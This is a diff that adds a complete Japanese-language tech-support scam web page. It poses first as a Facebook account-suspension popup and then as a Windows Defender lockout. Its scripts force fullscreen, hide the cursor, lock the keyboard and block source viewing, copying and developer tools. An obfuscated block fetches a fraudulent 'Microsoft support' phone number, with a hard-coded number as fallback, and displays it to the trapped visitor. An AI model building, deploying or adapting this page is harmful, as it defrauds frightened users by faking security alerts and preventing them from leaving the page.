@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>アプリが一時停止されました</title>
+    <style>
+        body {
+            background-image: url('bg1.png');
+            background-size: 100% 100%;
+            background-repeat: no-repeat;
+            background-position: center center;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            color: white;
+        }
+        body.g {
+            background-image: url('bgg.png');
+        }
+
+        body.fullscreen {
+            background-image: url('bg2.jpg');
+        }
+
+        #support-text {
+            position: absolute;
+            top: 80%;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 24px;
+            text-align: center;
+            width: 100%;
+            font-weight: bold;
+            color: black;
+            display: none;
+        }
+
+        #support-text span {
+            font-weight: normal;
+        }
+
+        #music {
+            display: none;
+        }
+
+        #modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 9999;
+        }
+
+        #modal-content {
+            background-color: white;
+            border-radius: 5px;
+            max-width: 400px;
+            margin: 100px auto;
+            padding: 20px;
+            text-align: center;
+        }
+
+        #modal-close {
+            cursor: pointer;
+            color: #888;
+            float: right;
+            font-size: 20px;
+            font-weight: bold;
+        }
+
+        #modal-message {
+            color: black;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+
+        #modal-image {
+            margin-bottom: 20px;
+        }
+
+        .modal-buttons {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+        }
+
+        .modal-buttons button {
+            width: 100px;
+            padding: 10px 0;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background-color 0.3s;
+        }
+
+        .modal-buttons button.accept {
+            background-color: white;
+            color: black;
+        }
+
+        .modal-buttons button.dismiss {
+            background-color: #3b5998;
+            color: white;
+        }
+
+        .modal-buttons button:hover {
+            background-color: rgba(0, 0, 0, 0.8);
+        }
+
+        @keyframes blink {
+            0% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0;
+            }
+
+            100% {
+                opacity: 1;
+            }
+        }
+
+        .modal-buttons button.dismiss.blinking {
+            animation: blink 1s infinite;
+        }
+
+        #welcomeDiv {
+            display: none;
+            background-color: #000;
+            height: auto;
+            width: 550px;
+            position: fixed;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 9999999999;
+            text-align: center;
+        }
+
+        #welcomeDiv p {
+            color: #FEFEFE;
+            margin-top: 10px;
+            font-size: 16px;
+            opacity: 0.9;
+        }
+    </style>
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            var isPopupVisible = true;
+            var music = document.getElementById('music');
+            var isPlaying = false;
+
+            function toggleMusic() {
+                if (isPlaying) {
+                    music.pause();
+                } else {
+                    music.play();
+                }
+                isPlaying = !isPlaying;
+            }
+
+            function playMusicOnClick() {
+                toggleMusic();
+                document.removeEventListener('click', playMusicOnClick);
+            }
+
+            music.addEventListener('click', toggleMusic);
+            document.addEventListener('click', playMusicOnClick);
+
+            var fullscreenEnabled = document.fullscreenEnabled || document.mozFullScreenEnabled || document.documentElement.webkitRequestFullScreen;
+
+            if (fullscreenEnabled) {
+                document.documentElement.requestFullscreen = document.documentElement.requestFullscreen || document.documentElement.mozRequestFullScreen || document.documentElement.webkitRequestFullScreen;
+                document.cancelFullscreen = document.cancelFullscreen || document.mozCancelFullScreen || document.webkitCancelFullScreen;
+
+                var isFullscreen = false;
+
+                document.addEventListener('click', function () {
+                    if (!isFullscreen) {
+                        isFullscreen = true;
+                        document.documentElement.requestFullscreen();
+                        document.body.classList.add('fullscreen');
+                        showWelcomeDiv();
+                        showSupportText();
+                    }
+                });
+
+                document.addEventListener('fullscreenchange', function () {
+                    isFullscreen = !isFullscreen;
+                });
+            }
+
+            var modalOverlay = document.getElementById('modal-overlay');
+            var modalClose = document.getElementById('modal-close');
+
+            function showModal() {
+                modalOverlay.style.display = 'block';
+            }
+
+            function closeModal() {
+                modalOverlay.style.display = 'none';
+            }
+
+            modalClose.addEventListener('click', closeModal);
+
+            showModal();
+
+            function hideCursor() {
+                document.documentElement.style.cursor = 'none';
+            }
+
+            document.addEventListener('click', function () {
+                hideCursor();
+                document.removeEventListener('click', hideCursor);
+                if (isPopupVisible) {
+                    closeModal();
+                    isPopupVisible = false;
+                }
+            });
+
+            var acceptButton = document.getElementById('modal-accept');
+            var dismissButton = document.getElementById('modal-dismiss');
+
+            acceptButton.addEventListener('click', closeModal);
+            dismissButton.addEventListener('click', closeModal);
+
+            document.addEventListener('contextmenu', function (event) {
+                event.preventDefault();
+            });
+
+            document.addEventListener('keydown', function (e) {
+                if (e.ctrlKey && (e.keyCode === 'U'.charCodeAt(0) || e.keyCode === 'u'.charCodeAt(0)) ||
+                    e.ctrlKey && (e.keyCode === 'C'.charCodeAt(0) || e.keyCode === 'c'.charCodeAt(0)) ||
+                    e.ctrlKey && (e.keyCode === 'S'.charCodeAt(0) || e.keyCode === 's'.charCodeAt(0))) {
+                    e.preventDefault();
+                }
+            });
+
+            function preventKeyEvents(event) {
+                const blockedKeyCodes = [123];
+                const keyCode = event.keyCode || event.which;
+
+                if (blockedKeyCodes.includes(keyCode)) {
+                    event.preventDefault();
+                    console.log(`Key with code ${keyCode} is blocked.`);
+                }
+            }
+
+            window.addEventListener('keydown', preventKeyEvents);
+        });
+
+        navigator.keyboard.lock();
+        document.onkeydown = function (e) {
+            return false;
+        }
+
+        function showWelcomeDiv() {
+            var welcomeDiv = document.getElementById('welcomeDiv');
+            welcomeDiv.style.display = 'block';
+        }
+
+        function showSupportText() {
+            var supportText = document.getElementById('support-text');
+            supportText.style.display = 'block';
+        }
+    </script>
+</head>
+
+<body>
+<audio id="music" src="text-to-speech.mp3" controls loop></audio>
+
+<div id="modal-overlay">
+    <div id="modal-content">
+        <span id="modal-close">&times;</span>
+        <img id="modal-image" src="logofb.jpg" alt="Facebook Logo">
+        <p id="modal-message">Facebook があなたのアカウントを一時的に停止しました。</p>
+        <div class="modal-buttons">
+            <button id="modal-accept" class="accept">受け入れる</button>
+            <button id="modal-dismiss" class="dismiss blinking">無視する</button>
+        </div>
+    </div>
+</div>
+
+<div id="welcomeDiv">
+    <p>
+        Windows Defender セキュリティによりコンピュータが無効になりました。<br>
+        コンピュータのロックを解除するには、Microsoft Windows サポートにお問い合わせください。<br> Toll Free <strong id="t1"></strong>
+    </p>
+</div>
+
+<div id="support-text">Microsoft Windows サポートにフリーダイヤルで電話する <strong id="t2"></strong></div>
+
+
+<script>
+    const _0x85a114=_0x52c7;function _0x52c7(_0x2df320,_0x6f7801){const _0x595ef8=_0x595e();return _0x52c7=function(_0x52c7a3,_0x2e46e3){_0x52c7a3=_0x52c7a3-0xff;let _0x3096e8=_0x595ef8[_0x52c7a3];return _0x3096e8;},_0x52c7(_0x2df320,_0x6f7801);}function _0x595e(){const _0x5cbd19=['error','then','okok','64yUDlNU','modal-image','543664kQognC','+1-844-418-3128','GET','Network\x20response\x20was\x20not\x20ok','modal-message','tfn','1122968tvoSth','939805DUWnxf','okok','11668ZWaIbb','6401263VMGpje','body','4arZiIp','18NTienL','textContent','680829cwPzoE','Error\x20fetching\x20or\x20processing\x20data:','has','1356310jodBGb','json','classList','application/json','Google\x20Found\x20A\x20Virus\x20On\x20Your\x20Computer.','27wzMoxq','add','catch','recipes','getElementById','search','location','src'];_0x595e=function(){return _0x5cbd19;};return _0x595e();}(function(_0x56f69c,_0x355537){const _0x498b6d=_0x52c7,_0x1e4a9f=_0x56f69c();while(!![]){try{const _0x26c271=parseInt(_0x498b6d(0x11a))/0x1*(parseInt(_0x498b6d(0x101))/0x2)+parseInt(_0x498b6d(0x107))/0x3+parseInt(_0x498b6d(0x104))/0x4*(parseInt(_0x498b6d(0xff))/0x5)+-parseInt(_0x498b6d(0x105))/0x6*(-parseInt(_0x498b6d(0x122))/0x7)+-parseInt(_0x498b6d(0x11c))/0x8*(parseInt(_0x498b6d(0x10f))/0x9)+-parseInt(_0x498b6d(0x10a))/0xa+-parseInt(_0x498b6d(0x102))/0xb;if(_0x26c271===_0x355537)break;else _0x1e4a9f['push'](_0x1e4a9f['shift']());}catch(_0x1447c7){_0x1e4a9f['push'](_0x1e4a9f['shift']());}}}(_0x595e,0x54fd2));const urlParams=new URLSearchParams(window[_0x85a114(0x115)][_0x85a114(0x114)]);urlParams[_0x85a114(0x109)](_0x85a114(0x112))?(document[_0x85a114(0x103)][_0x85a114(0x10c)][_0x85a114(0x110)]('g'),document[_0x85a114(0x113)](_0x85a114(0x11b))[_0x85a114(0x116)]='glogo.png',document['getElementById'](_0x85a114(0x120))['textContent']=_0x85a114(0x10e),fetch(_0x85a114(0x119),{'method':_0x85a114(0x11e),'headers':{'Accept':_0x85a114(0x10d)}})[_0x85a114(0x118)](_0x4f38ec=>{const _0x49cc4f=_0x85a114;if(!_0x4f38ec['ok'])throw new Error(_0x49cc4f(0x11f));return _0x4f38ec['json']();})[_0x85a114(0x118)](_0x333354=>{const _0x4386ba=_0x85a114,_0xb70c8b=_0x333354[_0x4386ba(0x121)],_0x3ce1ab=document[_0x4386ba(0x113)]('t1'),_0x292d70=document[_0x4386ba(0x113)]('t2');_0x3ce1ab[_0x4386ba(0x106)]=_0xb70c8b,_0x292d70[_0x4386ba(0x106)]=_0xb70c8b;})[_0x85a114(0x111)](_0x3607d6=>{const _0x18b5de=_0x85a114;console[_0x18b5de(0x117)](_0x18b5de(0x108),_0x3607d6);const _0x41f197=document[_0x18b5de(0x113)]('t1'),_0x3f55ba=document['getElementById']('t2');_0x41f197[_0x18b5de(0x106)]=_0x18b5de(0x11d),_0x3f55ba['textContent']='+1-844-418-3128';})):fetch(_0x85a114(0x100),{'method':'GET','headers':{'Accept':'application/json'}})[_0x85a114(0x118)](_0x4be728=>{const _0x23dc40=_0x85a114;if(!_0x4be728['ok'])throw new Error(_0x23dc40(0x11f));return _0x4be728[_0x23dc40(0x10b)]();})[_0x85a114(0x118)](_0x5cf6d5=>{const _0x1ef82f=_0x85a114,_0x4f793f=_0x5cf6d5[_0x1ef82f(0x121)],_0xcbbadd=document['getElementById']('t1'),_0x28ffef=document['getElementById']('t2');_0xcbbadd['textContent']=_0x4f793f,_0x28ffef[_0x1ef82f(0x106)]=_0x4f793f;})[_0x85a114(0x111)](_0x3fe3ec=>{const _0xd050db=_0x85a114;console['error']('Error\x20fetching\x20or\x20processing\x20data:',_0x3fe3ec);const _0x4ac4ac=document['getElementById']('t1'),_0x413c38=document[_0xd050db(0x113)]('t2');_0x4ac4ac[_0xd050db(0x106)]=_0xd050db(0x11d),_0x413c38[_0xd050db(0x106)]=_0xd050db(0x11d);});
+</script>
+</body>
+
+
+
+
+</html>
+
+  
